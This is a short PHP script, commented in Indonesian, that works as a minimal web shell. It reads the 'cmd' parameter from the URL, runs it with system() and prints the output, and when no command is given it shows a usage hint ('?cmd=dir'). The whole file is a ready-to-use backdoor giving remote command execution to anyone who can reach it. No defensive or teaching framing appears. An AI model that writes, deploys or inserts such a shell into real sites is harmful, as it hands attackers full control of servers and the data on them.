<?php
// Mengambil input dari parameter URL 'cmd'
if(isset($_GET['cmd'])) {
    echo "<pre>";
    // Menjalankan perintah sistem yang diterima dari browser
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Gunakan parameter ?cmd= di URL. Contoh: ?cmd=dir";
}
?>